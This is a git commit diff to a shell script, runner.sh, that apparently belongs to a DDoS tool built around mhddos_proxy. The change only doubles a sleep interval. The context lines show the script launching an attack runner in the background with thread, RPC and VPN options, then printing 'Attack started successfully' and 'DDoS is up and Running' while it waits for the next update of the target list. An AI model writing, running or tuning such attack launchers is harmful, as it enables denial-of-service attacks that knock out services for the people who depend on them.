61d5d70922f70f7b5f958d12d94f427b5f518baa
alexnest-ua <74729549+alexnest-ua@users.noreply.github.com>
2022-05-18 14:55:53 +0300

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -292,7 +292,7 @@ do
             
             		cd ~/mhddos_proxy
             		python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
-	    		sleep 10s
+	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 		done
 		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
